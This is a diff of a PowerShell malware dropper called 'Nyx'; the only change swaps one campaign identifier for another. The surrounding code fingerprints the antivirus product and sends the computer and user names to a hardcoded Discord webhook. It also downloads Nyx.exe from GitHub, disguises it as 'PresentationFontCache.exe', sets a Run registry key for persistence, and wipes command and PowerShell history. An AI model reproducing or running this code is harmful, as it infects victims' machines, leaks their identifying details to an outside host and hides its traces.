@@ -1,4 +1,4 @@
-# Nyx - DH79TXV5
+# Nyx - ENVM6FTC
 
 $Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntivirusProduct
 
@@ -7,7 +7,7 @@ if ($Antivirus -and $Antivirus.displayName -ne "Windows Defender") {
 $WebhookUrl = "https://discord.com/api/webhooks/1076454751140597841/4kStnAeJdVLHb6Dc99czhwSi23Kwnzvbz7pxydOPiFeyvK4MSPibTO9-TlTLoJkrj1iY"
 
 # Set message content
-$Message = "**DH79TXV5  |  ComputerName: $env:COMPUTERNAME  |  UserName: $env:USERNAME**`nHas been found unknown antivirus product: $($Antivirus.displayName)`nNyx installation cancelled!"
+$Message = "**ENVM6FTC  |  ComputerName: $env:COMPUTERNAME  |  UserName: $env:USERNAME**`nHas been found unknown antivirus product: $($Antivirus.displayName)`nNyx installation cancelled!"
 
 # Build JSON object with message data
 $Json = @{
@@ -27,7 +27,7 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 } else {
 # Download Nyx
-Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/DH79TXV5/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"
+Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/ENVM6FTC/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"
 
 # Change Nyx Name
 Rename-Item -Path "$env:TEMP\Nyx.exe" -NewName "PresentationFontCache.exe"
@@ -45,7 +45,7 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 $WebhookUrl = "https://discord.com/api/webhooks/1076454751140597841/4kStnAeJdVLHb6Dc99czhwSi23Kwnzvbz7pxydOPiFeyvK4MSPibTO9-TlTLoJkrj1iY"
 
 # Set message content
-$Message = "**DH79TXV5  |  ComputerName: $env:COMPUTERNAME  |  UserName: $env:USERNAME**`nNyx installation completed!"
+$Message = "**ENVM6FTC  |  ComputerName: $env:COMPUTERNAME  |  UserName: $env:USERNAME**`nNyx installation completed!"
 
 # Build JSON object with message data
 $Json = @{
